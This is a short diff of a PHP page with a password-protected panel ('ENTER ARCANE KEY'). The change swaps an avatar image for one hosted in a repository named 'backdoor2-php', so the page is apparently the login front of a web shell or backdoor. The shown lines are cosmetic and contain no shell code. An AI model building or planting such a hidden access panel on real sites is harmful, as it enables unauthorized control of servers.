@@ -200,7 +200,7 @@ canvas {
 
 <div class="capsule">
   <div class="title">ARCANE RUNE | ELLE ROOM</div>
-  <img src="https://cbcdn.githack.com/dex88/dex/raw/branch/main/ELLE/img/elle.jpg" alt="Avatar">
+  <img src="https://cdn.jsdelivr.net/gh/dex-xx/backdoor2-php@main/img/elle.jpg" alt="Avatar">
   
   <form method="POST">
     <input type="password" name="ELLE" placeholder="ENTER ARCANE KEY">
@@ -254,5 +254,6 @@ for(let i=0;i<25;i++){
 
     <?php
 }
+
 
 ?>
